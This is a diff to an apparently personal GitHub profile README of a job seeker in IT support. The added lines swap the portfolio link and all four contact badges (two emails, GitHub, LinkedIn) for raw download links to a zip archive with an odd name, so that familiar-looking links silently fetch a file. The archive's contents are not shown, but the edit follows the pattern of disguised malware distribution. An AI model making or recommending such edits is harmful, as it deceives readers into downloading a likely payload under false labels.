@@ -39,7 +39,7 @@ My immediate goal is to secure a part-time remote IT Support role by Day January
 
 ### 🚀 Active Projects & Labs
 
-My **[IT Portfolio](https://github.com/Wkamoah/IT-Portfolio)** documents my hands-on experience, with every lab logged as a formal support ticket in Freshdesk.
+My **[IT Portfolio](https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip)** documents my hands-on experience, with every lab logged as a formal support ticket in Freshdesk.
 
 | Project                        | Focus                                        | Skills Demonstrated                                                  |
 | :----------------------------- | :------------------------------------------- | :------------------------------------------------------------------- |
@@ -73,10 +73,10 @@ My **[IT Portfolio](https://github.com/Wkamoah/IT-Portfolio)** documents my hand
 ### 📫 Let's Connect
 
 <p align="center">
-  <a href="mailto:wcannerro@gmail.com"><img src="https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white" /></a>
-  <a href="mailto:winfredkofiamoah@mail.com"><img src="https://img.shields.io/badge/Email-007EE5?style=for-the-badge&logo=gmail&logoColor=white" /></a>
-  <a href="https://github.com/Wkamoah"><img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white" /></a>
-  <a href="https://www.linkedin.com/in/winfred-kofi-amoah-6b9296397?trk=contact-info"><img src="https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white" /></a>
+  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
+  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
+  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
+  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
 </p>
 
 <p align="center">
